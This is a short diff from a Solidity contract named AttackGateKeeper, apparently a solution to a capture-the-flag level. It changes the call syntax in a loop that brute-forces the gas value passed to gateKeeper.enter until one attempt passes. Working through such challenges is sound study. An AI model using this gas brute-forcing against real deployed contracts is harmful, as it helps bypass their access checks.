@@ -12,7 +12,7 @@ contract AttackGateKeeper {
 
     function attack(bytes8 key, uint baseGas) public {
         for (uint i =0 ; i<8192; i++){
-            try gateKeeper.enter{gas: baseGas+i}(key) {
+            try gateKeeper.enter.gas(baseGas+i)(key) {
                 return;
             }
             catch {
